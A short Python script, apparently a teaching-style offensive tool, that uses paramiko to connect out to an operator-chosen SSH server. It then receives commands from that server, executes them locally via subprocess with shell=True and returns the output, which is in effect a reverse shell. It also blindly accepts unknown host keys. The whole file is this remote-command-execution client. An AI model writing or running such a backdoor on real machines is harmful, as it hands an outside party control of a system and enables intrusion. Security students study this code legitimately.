import paramiko
import shlex
import subprocess
import getpass

def ssh_command(ip, port, username, password, command):
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)

    ssh_session = client.get_transport().open_session()
    
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

    while True:
        command = ssh_session.recv(1024)
        try:
            cmd = command.decode()
            if cmd == "exit":
                client.close()
                break

            cmd_arguments = shlex.split(cmd)
            cmd_output = subprocess.check_output(cmd_arguments, shell=True)
            ssh_session.send(cmd_output or "okay")

        except Exception as e:
            ssh_session.send(str(e))

    client.close()

if __name__ == "__main__":
    user = getpass.getpass()
    password = getpass.getpass()

    ip = input("Enter server IP: ")
    port = input("Enter port: ")
    ssh_command(ip, port, user, password, "ClientConnected")
